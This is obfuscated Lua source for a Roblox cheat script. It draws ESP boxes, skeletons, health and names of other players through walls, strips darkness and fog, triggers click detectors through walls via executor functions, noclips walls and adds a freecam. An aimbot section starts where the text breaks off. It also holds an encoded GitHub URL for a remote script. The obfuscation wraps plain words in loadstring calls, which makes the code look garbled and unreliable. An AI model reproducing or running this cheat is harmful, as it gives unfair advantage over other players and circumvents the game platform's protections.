return(function(R1Lfb, ...)
local ME1x8k = {"1lZ";"kWDfcbuGIT";"tcz0";"7l7Uxjej8";"7ZOR5h3kgYQ";"SrYMaAfnR";"77jE";"cDS";"0VBodOz1vJtmQ";"OdueJB4ki";"GLasBYPjAlitJc"}
local CBe0LQhO = function(...)
local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
local UserInputService = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
local Lighting = game:GetService(loadstring(base64decode("TGlnaHRpbmc="))())
local ContextActionService = game:GetService(loadstring(base64decode("Q29udGV4dEFjdGlvblNlcnZpY2U="))())
local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
local LocalPlayer = Players.LocalPlayer

local env = type(getgenv) == loadstring(base64decode("ZnVuY3Rpb24="))() and getgenv() or _G
if env.__TownEspCleanup then pcall(env.__TownEspCleanup) end

local MENU_KEY = Enum.KeyCode.RightShift
local DEX_URL = loadstring(base64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbmR3aWNobW0vaWdub3JlL3JlZnMvaGVhZHMvbWFpbi9rN1FtMnhSOXZUNHBMOHdaM25CNi5sdWE="))()
local COLOR = Color3.new(1, 1, 1)

local options = {
    esp = true, box = true, skeleton = true, names = true, tracers = false, health = true, day = false, nodark = false, nofog = false, killlog = true, loadoutspawn = false,
    wallclick = false, noclip = false, watchlist = true, viscolor = true, safe = true, freecam = false, fly = false,
    aimbot = false, aimtoggle = false, aimgun = false, aimwall = true, aimteam = false, aimsafe = true,
    aimcircle = true, aimoffset = false, wallbang = false, spy = false, aimtracer = false,
}
local DAY_CLOCK = 14
local savedClock
local entries = {}
local connections = {}

local BONES_R15 = {
    { loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VXBwZXJUb3Jzbw=="))() }, { loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("TG93ZXJUb3Jzbw=="))() },
    { loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("TGVmdFVwcGVyQXJt"))() }, { loadstring(base64decode("TGVmdFVwcGVyQXJt"))(), loadstring(base64decode("TGVmdExvd2VyQXJt"))() }, { loadstring(base64decode("TGVmdExvd2VyQXJt"))(), loadstring(base64decode("TGVmdEhhbmQ="))() },
    { loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("UmlnaHRVcHBlckFybQ=="))() }, { loadstring(base64decode("UmlnaHRVcHBlckFybQ=="))(), loadstring(base64decode("UmlnaHRMb3dlckFybQ=="))() }, { loadstring(base64decode("UmlnaHRMb3dlckFybQ=="))(), loadstring(base64decode("UmlnaHRIYW5k"))() },
    { loadstring(base64decode("TG93ZXJUb3Jzbw=="))(), loadstring(base64decode("TGVmdFVwcGVyTGVn"))() }, { loadstring(base64decode("TGVmdFVwcGVyTGVn"))(), loadstring(base64decode("TGVmdExvd2VyTGVn"))() }, { loadstring(base64decode("TGVmdExvd2VyTGVn"))(), loadstring(base64decode("TGVmdEZvb3Q="))() },
    { loadstring(base64decode("TG93ZXJUb3Jzbw=="))(), loadstring(base64decode("UmlnaHRVcHBlckxlZw=="))() }, { loadstring(base64decode("UmlnaHRVcHBlckxlZw=="))(), loadstring(base64decode("UmlnaHRMb3dlckxlZw=="))() }, { loadstring(base64decode("UmlnaHRMb3dlckxlZw=="))(), loadstring(base64decode("UmlnaHRGb290"))() },
}
local BONES_R6 = {
    { loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VG9yc28="))() }, { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("TGVmdCBBcm0="))() }, { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("UmlnaHQgQXJt"))() },
    { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("TGVmdCBMZWc="))() }, { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("UmlnaHQgTGVn"))() },
}
local MAX_BONES = #BONES_R15

local WATCH_COLOR = Color3.fromRGB(255, 40, 40)
local SAFE_COLOR = Color3.fromRGB(90, 255, 120)
local UNSAFE_COLOR = Color3.fromRGB(255, 130, 40)
local HIDDEN_DIM = 0.45
local DEAD_HEALTH = 1
local HEALTH_FULL = Color3.fromRGB(70, 255, 100)
local HEALTH_EMPTY = Color3.fromRGB(255, 50, 50)
local WATCH_FILE = loadstring(base64decode("VG93bkVzcFdhdGNobGlzdC50eHQ="))()
local watchlist = {}

local function saveWatchlist()
    if type(writefile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
    local names = {}
    for name in pairs(watchlist) do table.insert(names, name) end
    pcall(writefile, WATCH_FILE, table.concat(names, loadstring(base64decode("XG4="))()))
end

local function loadWatchlist()
    if type(isfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() or type(readfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
    local ok, text = pcall(function()
        return isfile(WATCH_FILE) and readfile(WATCH_FILE) or loadstring(base64decode(""))()
    end)
    if not ok then return end
    for line in string.gmatch(text, loadstring(base64decode("W15cclxuXSs="))()) do watchlist[line:lower()] = true end
end
loadWatchlist()

local function addWatch(text)
    local q = (text or loadstring(base64decode(""))()):match(loadstring(base64decode("XiVzKiguLSklcyok"))()):lower()
    if q == loadstring(base64decode(""))() then return end

    local matches = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():sub(1, #q) == q or plr.DisplayName:lower():sub(1, #q) == q then
            table.insert(matches, plr)
        end
    end
    if #matches == 1 then q = matches[1].Name:lower() end
    watchlist[q] = true
    saveWatchlist()
end

local function isWatched(player)
    return options.watchlist
        and (watchlist[player.Name:lower()] or watchlist[player.DisplayName:lower()]) == true
end

local visibilityParams = RaycastParams.new()
visibilityParams.FilterType = Enum.RaycastFilterType.Exclude
visibilityParams.RespectCanCollide = true

local function isVisible(camera, character, root)
    local ignore = { character }
    local mine = LocalPlayer.Character
    if mine then table.insert(ignore, mine) end
    visibilityParams.FilterDescendantsInstances = ignore

    local origin = camera.CFrame.Position
    if not Workspace:Raycast(origin, root.Position - origin, visibilityParams) then return true end
    local head = character:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
    if head and not Workspace:Raycast(origin, head.Position - origin, visibilityParams) then return true end
    return false
end

local parentGui = (type(gethui) == loadstring(base64decode("ZnVuY3Rpb24="))() and gethui()) or LocalPlayer:WaitForChild(loadstring(base64decode("UGxheWVyR3Vp"))())

local overlay = Instance.new(loadstring(base64decode("U2NyZWVuR3Vp"))())
overlay.Name = loadstring(base64decode("VG93bkVzcE92ZXJsYXk="))()
overlay.ResetOnSpawn = false
overlay.IgnoreGuiInset = true
overlay.DisplayOrder = 1
overlay.Parent = parentGui

local function newEntry()
    local box = Instance.new(loadstring(base64decode("RnJhbWU="))())
    box.BackgroundTransparency = 1
    box.BorderSizePixel = 0
    box.Visible = false
    box.Parent = overlay
    local stroke = Instance.new(loadstring(base64decode("VUlTdHJva2U="))())
    stroke.Color = COLOR
    stroke.Thickness = 1
    stroke.Parent = box

    local label = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
    label.Size = UDim2.fromOffset(200, 14)
    label.AnchorPoint = Vector2.new(0.5, 1)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Code
    label.TextSize = 14
    label.TextColor3 = COLOR
    label.TextStrokeTransparency = 0
    label.Visible = false
    label.Parent = overlay

    local safeLabel = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
    safeLabel.Size = UDim2.fromOffset(120, 14)
    safeLabel.AnchorPoint = Vector2.new(0.5, 0)
    safeLabel.BackgroundTransparency = 1
    safeLabel.Font = Enum.Font.Code
    safeLabel.TextSize = 14
    safeLabel.TextColor3 = SAFE_COLOR
    safeLabel.TextStrokeTransparency = 0
    safeLabel.Visible = false
    safeLabel.Parent = overlay

    local healthBack = Instance.new(loadstring(base64decode("RnJhbWU="))())
    healthBack.BackgroundColor3 = Color3.new(0, 0, 0)
    healthBack.BackgroundTransparency = 0.3
    healthBack.BorderSizePixel = 0
    healthBack.Visible = false
    healthBack.Parent = overlay

    local healthFill = Instance.new(loadstring(base64decode("RnJhbWU="))())
    healthFill.AnchorPoint = Vector2.new(0, 1)
    healthFill.Position = UDim2.fromScale(0, 1)
    healthFill.Size = UDim2.fromScale(1, 1)
    healthFill.BackgroundColor3 = HEALTH_FULL
    healthFill.BorderSizePixel = 0
    healthFill.Parent = healthBack

    local healthText = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
    healthText.Size = UDim2.fromOffset(30, 12)
    healthText.AnchorPoint = Vector2.new(1, 0.5)
    healthText.BackgroundTransparency = 1
    healthText.Font = Enum.Font.Code
    healthText.TextSize = 12
    healthText.TextColor3 = COLOR
    healthText.TextStrokeTransparency = 0
    healthText.TextXAlignment = Enum.TextXAlignment.Right
    healthText.Visible = false
    healthText.Parent = overlay

    local lines = {}
    for JfZaEVmK = 1, MAX_BONES do
        local line = Instance.new(loadstring(base64decode("RnJhbWU="))())
        line.AnchorPoint = Vector2.new(0.5, 0.5)
        line.BackgroundColor3 = COLOR
        line.BorderSizePixel = 0
        line.Visible = false
        line.Parent = overlay
        lines[JfZaEVmK] = line
    end

    local tracer = Instance.new(loadstring(base64decode("RnJhbWU="))())
    tracer.AnchorPoint = Vector2.new(0.5, 0.5)
    tracer.BackgroundColor3 = COLOR
    tracer.BorderSizePixel = 0
    tracer.Visible = false
    tracer.Parent = overlay

    return {
        box = box, stroke = stroke, label = label, safeLabel = safeLabel, lines = lines, tracer = tracer,
        healthBack = healthBack, healthFill = healthFill, healthText = healthText,
        shown = false, color = COLOR,
    }
end

local function destroyEntry(entry)
    entry.box:Destroy()
    entry.label:Destroy()
    entry.safeLabel:Destroy()
    entry.tracer:Destroy()
    entry.healthBack:Destroy()
    entry.healthText:Destroy()
    for _, line in ipairs(entry.lines) do line:Destroy() end
end

local function hideEntry(entry)
    if not entry.shown then return end
    entry.shown = false
    entry.box.Visible = false
    entry.label.Visible = false
    entry.safeLabel.Visible = false
    entry.tracer.Visible = false
    entry.healthBack.Visible = false
    entry.healthText.Visible = false
    for _, line in ipairs(entry.lines) do line.Visible = false end
end

local function applyColor(entry, color)
    entry.color = color
    entry.stroke.Color = color
    entry.label.TextColor3 = color
    entry.tracer.BackgroundColor3 = color
    for _, line in ipairs(entry.lines) do line.BackgroundColor3 = color end
end

local function setLine(line, a, b)
    local delta = b - a
    line.Size = UDim2.fromOffset(delta.Magnitude, 1)
    line.Position = UDim2.fromOffset((a.X + b.X) / 2, (a.Y + b.Y) / 2)
    line.Rotation = math.deg(math.atan2(delta.Y, delta.X))
    line.Visible = true
end

local function render()
    local camera = Workspace.CurrentCamera
    if not camera then return end

    for player, entry in pairs(entries) do
        local character = player.Character
        local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        local humanoid = character and character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())

        local rootPos, onScreen
        if options.esp and root and humanoid and humanoid.Health > DEAD_HEALTH then
            rootPos, onScreen = camera:WorldToViewportPoint(root.Position)
        end

        if not onScreen then
            hideEntry(entry)
        else
            entry.shown = true

            local base = isWatched(player) and WATCH_COLOR or COLOR
            local visible = not options.viscolor or isVisible(camera, character, root)
            local color = visible and base or base:Lerp(Color3.new(0, 0, 0), HIDDEN_DIM)
            if entry.color ~= color then applyColor(entry, color) end

            local ok, cf, size = pcall(character.GetBoundingBox, character)
            local center = ok and cf.Position or root.Position
            local halfHeight = ok and size.Y / 2 or 3
            local top = camera:WorldToViewportPoint(center + Vector3.new(0, halfHeight, 0))
            local bottom = camera:WorldToViewportPoint(center - Vector3.new(0, halfHeight, 0))
            local height = math.abs(bottom.Y - top.Y)
            local width = height * 0.55

            entry.box.Visible = options.box and top.Z > 0 and bottom.Z > 0
            if entry.box.Visible then
                entry.box.Position = UDim2.fromOffset(rootPos.X - width / 2, top.Y)
                entry.box.Size = UDim2.fromOffset(width, height)
            end

            local showHealth = options.health and top.Z > 0 and bottom.Z > 0
            entry.healthBack.Visible = showHealth
            entry.healthText.Visible = showHealth
            if showHealth then
                local maxHealth = math.max(humanoid.MaxHealth, 1)
                local fraction = math.clamp(humanoid.Health / maxHealth, 0, 1)
                local barX = rootPos.X - width / 2 - 6
                entry.healthBack.Position = UDim2.fromOffset(barX, top.Y)
                entry.healthBack.Size = UDim2.fromOffset(3, height)
                entry.healthFill.Size = UDim2.fromScale(1, fraction)
                entry.healthFill.BackgroundColor3 = HEALTH_EMPTY:Lerp(HEALTH_FULL, fraction)
                entry.healthText.Text = tostring(math.ceil(humanoid.Health))
                entry.healthText.Position = UDim2.fromOffset(barX - 2, top.Y + height * (1 - fraction))
            end

            if options.tracers and bottom.Z > 0 then
                local viewport = camera.ViewportSize
                setLine(entry.tracer,
                    Vector2.new(viewport.X / 2, viewport.Y),
                    Vector2.new(rootPos.X, bottom.Y))
            else
                entry.tracer.Visible = false
            end

            entry.safeLabel.Visible = options.safe and bottom.Z > 0
            if entry.safeLabel.Visible then
                local safe = character:FindFirstChildOfClass(loadstring(base64decode("Rm9yY2VGaWVsZA=="))()) ~= nil
                local tagColor = safe and SAFE_COLOR or UNSAFE_COLOR
                entry.safeLabel.Text = safe and loadstring(base64decode("U0FGRQ=="))() or loadstring(base64decode("VU5TQUZF"))()
                entry.safeLabel.TextColor3 = visible and tagColor or tagColor:Lerp(Color3.new(0, 0, 0), HIDDEN_DIM)
                entry.safeLabel.Position = UDim2.fromOffset(rootPos.X, bottom.Y + 2)
            end

            entry.label.Visible = options.names
            if options.names then
                local distance = math.floor((camera.CFrame.Position - root.Position).Magnitude)
                entry.label.Text = player.Name .. loadstring(base64decode("IFs="))() .. distance .. loadstring(base64decode("XQ=="))()
                entry.label.Position = UDim2.fromOffset(rootPos.X, top.Y - 2)
            end

            local bones = character:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))()) and BONES_R15 or BONES_R6
            for JfZaEVmK = 1, MAX_BONES do
                local line = entry.lines[JfZaEVmK]
                local bone = options.skeleton and bones[JfZaEVmK]
                local partA = bone and character:FindFirstChild(bone[1])
                local partB = bone and character:FindFirstChild(bone[2])
                if partA and partB then
                    local a = camera:WorldToViewportPoint(partA.Position)
                    local b = camera:WorldToViewportPoint(partB.Position)
                    if a.Z > 0 and b.Z > 0 then
                        setLine(line, Vector2.new(a.X, a.Y), Vector2.new(b.X, b.Y))
                    else
                        line.Visible = false
                    end
                else
                    line.Visible = false
                end
            end
        end
    end
end

local function hook(player)
    if player == LocalPlayer or entries[player] then return end
    entries[player] = newEntry()
end

local function unhook(player)
    local entry = entries[player]
    if not entry then return end
    entries[player] = nil
    destroyEntry(entry)
end

for _, player in ipairs(Players:GetPlayers()) do hook(player) end
table.insert(connections, Players.PlayerAdded:Connect(hook))
table.insert(connections, Players.PlayerRemoving:Connect(unhook))
table.insert(connections, RunService.RenderStepped:Connect(render))

table.insert(connections, RunService.Heartbeat:Connect(function()
    if options.day and Lighting.ClockTime ~= DAY_CLOCK then
        Lighting.ClockTime = DAY_CLOCK
    end
end))

local NODARK_LEVELS = {
    { name = loadstring(base64decode("TG93"))(),  ambient = 90,  exposure = 0 },
    { name = loadstring(base64decode("TWVk"))(),  ambient = 140, exposure = 0.25 },
    { name = loadstring(base64decode("SGlnaA=="))(), ambient = 190, exposure = 0.5 },
}
local noDarkLevel = 2
local noDarkSaved

local function raiseColor(current, floor)
    return Color3.new(math.max(current.R, floor.R), math.max(current.G, floor.G), math.max(current.B, floor.B))
end

local function applyNoDark()
    if not options.nodark then return end
    local level = NODARK_LEVELS[noDarkLevel]
    local floor = Color3.fromRGB(level.ambient, level.ambient, level.ambient)

    local ambient = raiseColor(Lighting.Ambient, floor)
    if ambient ~= Lighting.Ambient then Lighting.Ambient = ambient end

    local outdoor = raiseColor(Lighting.OutdoorAmbient, floor)
    if outdoor ~= Lighting.OutdoorAmbient then Lighting.OutdoorAmbient = outdoor end

    if Lighting.ExposureCompensation < level.exposure then
        Lighting.ExposureCompensation = level.exposure
    end
end

local function restoreNoDark()
    if not noDarkSaved then return end
    Lighting.Ambient = noDarkSaved.ambient
    Lighting.OutdoorAmbient = noDarkSaved.outdoor
    Lighting.ExposureCompensation = noDarkSaved.exposure
    noDarkSaved = nil
end

table.insert(connections, RunService.RenderStepped:Connect(applyNoDark))
table.insert(connections, RunService.Heartbeat:Connect(applyNoDark))
for _, prop in ipairs({ loadstring(base64decode("QW1iaWVudA=="))(), loadstring(base64decode("T3V0ZG9vckFtYmllbnQ="))(), loadstring(base64decode("RXhwb3N1cmVDb21wZW5zYXRpb24="))() }) do

    table.insert(connections, Lighting:GetPropertyChangedSignal(prop):Connect(applyNoDark))
end

pcall(function()
    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcE5vRGFyaw=="))(), Enum.RenderPriority.Last.Value + 1, applyNoDark)
end)

local NOFOG_DISTANCE = 1e6
local noFogSaved
local atmospheres = {}
local atmosphereSaved = {}

local function saveAtmosphere(atmosphere)
    if not atmosphereSaved[atmosphere] then
        atmosphereSaved[atmosphere] = { density = atmosphere.Density, haze = atmosphere.Haze }
    end
end

local function applyNoFog()
    if not options.nofog then return end
    if Lighting.FogEnd ~= NOFOG_DISTANCE then Lighting.FogEnd = NOFOG_DISTANCE end
    if Lighting.FogStart ~= NOFOG_DISTANCE then Lighting.FogStart = NOFOG_DISTANCE end
    for atmosphere in pairs(atmospheres) do
        if atmosphere.Parent then
            saveAtmosphere(atmosphere)
            if atmosphere.Density ~= 0 then atmosphere.Density = 0 end
            if atmosphere.Haze ~= 0 then atmosphere.Haze = 0 end
        else
            atmospheres[atmosphere] = nil
        end
    end
end

local function restoreNoFog()
    if noFogSaved then
        Lighting.FogStart = noFogSaved.fogStart
        Lighting.FogEnd = noFogSaved.fogEnd
        noFogSaved = nil
    end
    for atmosphere, original in pairs(atmosphereSaved) do
        if atmosphere.Parent then
            atmosphere.Density = original.density
            atmosphere.Haze = original.haze
        end
    end
    atmosphereSaved = {}
end

local function trackAtmosphere(atmosphere)
    if atmospheres[atmosphere] then return end
    atmospheres[atmosphere] = true

    table.insert(connections, atmosphere:GetPropertyChangedSignal(loadstring(base64decode("RGVuc2l0eQ=="))()):Connect(applyNoFog))
    table.insert(connections, atmosphere:GetPropertyChangedSignal(loadstring(base64decode("SGF6ZQ=="))()):Connect(applyNoFog))
    applyNoFog()
end

for _, descendant in ipairs(Lighting:GetDescendants()) do
    if descendant:IsA(loadstring(base64decode("QXRtb3NwaGVyZQ=="))()) then trackAtmosphere(descendant) end
end
table.insert(connections, Lighting.DescendantAdded:Connect(function(descendant)
    if descendant:IsA(loadstring(base64decode("QXRtb3NwaGVyZQ=="))()) then trackAtmosphere(descendant) end
end))

table.insert(connections, RunService.RenderStepped:Connect(applyNoFog))
table.insert(connections, RunService.Heartbeat:Connect(applyNoFog))
table.insert(connections, Lighting:GetPropertyChangedSignal(loadstring(base64decode("Rm9nRW5k"))()):Connect(applyNoFog))
table.insert(connections, Lighting:GetPropertyChangedSignal(loadstring(base64decode("Rm9nU3RhcnQ="))()):Connect(applyNoFog))

pcall(function()
    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcE5vRm9n"))(), Enum.RenderPriority.Last.Value + 1, applyNoFog)
end)

local WALL_RANGE = 60
local GAME_REACH = 32
local wallTargets = {}
local wallList = {}
local wallParams = RaycastParams.new()
wallParams.FilterType = Enum.RaycastFilterType.Include
local wallDirty = true
local lastWallClick = 0

local wallHighlight = Instance.new(loadstring(base64decode("SGlnaGxpZ2h0"))())
wallHighlight.FillColor = COLOR
wallHighlight.FillTransparency = 0.7
wallHighlight.OutlineColor = COLOR
wallHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
wallHighlight.Parent = (type(gethui) == loadstring(base64decode("ZnVuY3Rpb24="))() and gethui()) or Workspace

task.spawn(function()
    local count = 0
    for _, d in ipairs(Workspace:GetDescendants()) do
        if d:IsA(loadstring(base64decode("Q2xpY2tEZXRlY3Rvcg=="))()) then wallTargets[d] = true end
        count += 1
        if count % 4000 == 0 then task.wait() end
    end
    wallDirty = true
end)
table.insert(connections, Workspace.DescendantAdded:Connect(function(d)
    if d:IsA(loadstring(base64decode("Q2xpY2tEZXRlY3Rvcg=="))()) then wallTargets[d] = true; wallDirty = true end
end))
table.insert(connections, Workspace.DescendantRemoving:Connect(function(d)
    if wallTargets[d] then wallTargets[d] = nil; wallDirty = true end
end))

local function rebuildWall()
    wallDirty = false
    wallList = {}
    local seen = {}
    for cd in pairs(wallTargets) do
        local parent = cd.Parent
        if parent and parent:IsDescendantOf(Workspace) then
            if not seen[parent] then
                seen[parent] = true
                table.insert(wallList, parent)
            end
        else
            wallTargets[cd] = nil
        end
    end
    wallParams.FilterDescendantsInstances = wallList
end

local function mouseRay(camera)
    local mouse = UserInputService:GetMouseLocation()
    return camera:ViewportPointToRay(mouse.X, mouse.Y)
end

local function findWallTarget()
    local camera = Workspace.CurrentCamera
    if not camera then return end
    if wallDirty then rebuildWall() end
    if #wallList == 0 then return end

    local ray = mouseRay(camera)
    local hit = Workspace:Raycast(ray.Origin, ray.Direction * WALL_RANGE, wallParams)
    if not hit then return end

    local node = hit.Instance
    while node and node ~= Workspace do
        local cd = node:FindFirstChildOfClass(loadstring(base64decode("Q2xpY2tEZXRlY3Rvcg=="))())
        if cd then return cd, hit end
        node = node.Parent
    end
end

local function gameCanReach(cd, hit)
    local camera = Workspace.CurrentCamera
    local character = LocalPlayer.Character
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = character and { character } or {}

    local ray = mouseRay(camera)
    local first = Workspace:Raycast(ray.Origin, ray.Direction * WALL_RANGE, params)
    if not first or not (first.Instance == cd.Parent or first.Instance:IsDescendantOf(cd.Parent)) then
        return false
    end

    local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
    local reach = cd.MaxActivationDistance
    if reach <= 0 then reach = GAME_REACH end
    return root ~= nil and (root.Position - hit.Position).Magnitude <= reach
end

table.insert(connections, RunService.RenderStepped:Connect(function()
    if not options.wallclick then
        wallHighlight.Adornee = nil
        return
    end
    local cd = findWallTarget()
    local target = cd and cd.Parent
    wallHighlight.Adornee = (target and target:IsA(loadstring(base64decode("UFZJbnN0YW5jZQ=="))())) and target or nil
end))

table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
    if processed or not options.wallclick then return end
    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
    if os.clock() - lastWallClick < 0.2 then return end

    local cd, hit = findWallTarget()
    if not cd or gameCanReach(cd, hit) then return end

    lastWallClick = os.clock()
    pcall(fireclickdetector, cd)
end))

local noclipped = {}
local lastNoclipClick = 0

local function resetNoclip()
    for part, original in pairs(noclipped) do
        if part.Parent then
            part.CanCollide = original.canCollide
            part.Transparency = original.transparency
        end
    end
    noclipped = {}
end

local function pickWall(camera)
    local ignore = {}
    local character = LocalPlayer.Character
    if character then table.insert(ignore, character) end

    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    local mouse = UserInputService:GetMouseLocation()
    local ray = camera:ViewportPointToRay(mouse.X, mouse.Y)

    for _ = 1, 12 do
        params.FilterDescendantsInstances = ignore
        local hit = Workspace:Raycast(ray.Origin, ray.Direction * 500, params)
        if not hit then return nil end
        local part = hit.Instance
        if part:IsA(loadstring(base64decode("VGVycmFpbg=="))()) or not part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then return nil end

        local model = part:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
        local isPlayer = model and Players:GetPlayerFromCharacter(model)
        if isPlayer or (not part.CanCollide and not noclipped[part]) then
            table.insert(ignore, part)
        else
            return part
        end
    end
end

table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
    if processed or not options.noclip then return end
    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
    if os.clock() - lastNoclipClick < 0.15 then return end

    local camera = Workspace.CurrentCamera
    if not camera then return end
    local part = pickWall(camera)
    if not part then return end
    lastNoclipClick = os.clock()

    local saved = noclipped[part]
    if saved then
        part.CanCollide = saved.canCollide
        part.Transparency = saved.transparency
        noclipped[part] = nil
    else
        noclipped[part] = { canCollide = part.CanCollide, transparency = part.Transparency }
        part.CanCollide = false
        part.Transparency = 0.5
    end
end))

local FREECAM_KEY = Enum.KeyCode.P
local FC_ACTION = loadstring(base64decode("VG93bkVzcEZyZWVjYW1TaW5r"))()
local FC_SENSITIVITY = 0.004
local fc = { position = Vector3.new(), pitch = 0, yaw = 0, speed = 32, looking = false, saved = nil, conns = {} }
local refreshFreecam

local function applyFreecam()
    if not options.freecam then return end
    local camera = Workspace.CurrentCamera
    if not camera then return end
    if camera.CameraType ~= Enum.CameraType.Scriptable then camera.CameraType = Enum.CameraType.Scriptable end
    local cf = CFrame.new(fc.position) * CFrame.fromOrientation(fc.pitch, fc.yaw, 0)
    if camera.CFrame ~= cf then camera.CFrame = cf end
end

local function stepFreecam(dt)
    if not options.freecam then return end
    if not UserInputService:GetFocusedTextBox() then
        local function down(key) return UserInputService:IsKeyDown(key) and 1 or 0 end
        local x = down(Enum.KeyCode.D) - down(Enum.KeyCode.A)
        local eD4aGZhp = down(Enum.KeyCode.S) - down(Enum.KeyCode.W)
        local NNH7AO0X = math.max(down(Enum.KeyCode.E), down(Enum.KeyCode.Space))
            - math.max(down(Enum.KeyCode.Q), down(Enum.KeyCode.LeftControl))
        local rot = CFrame.fromOrientation(fc.pitch, fc.yaw, 0)
        local move = rot:VectorToWorldSpace(Vector3.new(x, 0, eD4aGZhp)) + Vector3.new(0, NNH7AO0X, 0)
        if move.Magnitude > 0 then
            local fast = (UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)) and 4 or 1
            fc.position = fc.position + move.Unit * fc.speed * fast * dt
        end
    end
    applyFreecam()
end

local function setFreecam(on)
    local camera = Workspace.CurrentCamera
    if on then
        if not camera then options.freecam = false return end
        fc.saved = { cameraType = camera.CameraType, subject = camera.CameraSubject }
        local rx, ry = camera.CFrame:ToOrientation()
        fc.position, fc.pitch, fc.yaw = camera.CFrame.Position, rx, ry
        camera.CameraType = Enum.CameraType.Scriptable

        ContextActionService:BindActionAtPriority(FC_ACTION, function()
            return Enum.ContextActionResult.Sink
        end, false, Enum.ContextActionPriority.High.Value,
            Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
            Enum.KeyCode.Q, Enum.KeyCode.E, Enum.KeyCode.Space, Enum.KeyCode.LeftControl)

        fc.conns = {
            camera:GetPropertyChangedSignal(loadstring(base64decode("Q0ZyYW1l"))()):Connect(applyFreecam),
            camera:GetPropertyChangedSignal(loadstring(base64decode("Q2FtZXJhVHlwZQ=="))()):Connect(applyFreecam),
        }
    else
        for _, connection in ipairs(fc.conns) do connection:Disconnect() end
        fc.conns = {}
        pcall(function() ContextActionService:UnbindAction(FC_ACTION) end)
        if fc.looking then
            fc.looking = false
            UserInputService.MouseBehavior = Enum.MouseBehavior.Default
        end
        if camera and fc.saved then
            camera.CameraType = fc.saved.cameraType
            if fc.saved.subject then camera.CameraSubject = fc.saved.subject end
        end
        fc.saved = nil
    end
end

table.insert(connections, RunService.RenderStepped:Connect(applyFreecam))
pcall(function()
    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcEZyZWVjYW0="))(), Enum.RenderPriority.Last.Value + 1, stepFreecam)
end)

table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == FREECAM_KEY then
        options.freecam = not options.freecam
        setFreecam(options.freecam)
        if refreshFreecam then refreshFreecam() end
    elseif options.freecam and input.UserInputType == Enum.UserInputType.MouseButton2 then
        fc.looking = true
        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
    end
end))
table.insert(connections, UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 and fc.looking then
        fc.looking = false
        UserInputService.MouseBehavior = Enum.MouseBehavior.Default
    end
end))
table.insert(connections, UserInputService.InputChanged:Connect(function(input)
    if not options.freecam then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement and fc.looking then
        fc.yaw = fc.yaw - input.Delta.X * FC_SENSITIVITY
        fc.pitch = math.clamp(fc.pitch - input.Delta.Y * FC_SENSITIVITY, -1.55, 1.55)
    elseif input.UserInputType == Enum.UserInputType.MouseWheel then
        fc.speed = math.clamp(fc.speed * (1.2 ^ input.Position.Z), 4, 500)
    end
end))

local AIM_PARTS = { loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("Um9vdA=="))() }
local AIM_LOCKS = { loadstring(base64decode("Q0ZyYW1l"))(), loadstring(base64decode("TW91c2U="))(), loadstring(base64decode("QWJzb2x1dGU="))() }
local aimPartIndex, aimLockIndex = 1, 1
local WALL_METHODS = { loadstring(base64decode("QXV0bw=="))(), loadstring(base64decode("RW5naW5l"))(), loadstring(base64decode("UGFydHM="))() }
local wallMethodIndex = 1
local aimFov, aimSmooth, aimOffset = 180, 0, 5
local aimDebugLabel
local wallDebugLabel
local spyRefresh
local lastDebug, lastPatch = 0, 0

local aim = { running = false, locked = nil, savedSensitivity = nil }

local aimCircle = Instance.new(loadstring(base64decode("RnJhbWU="))())
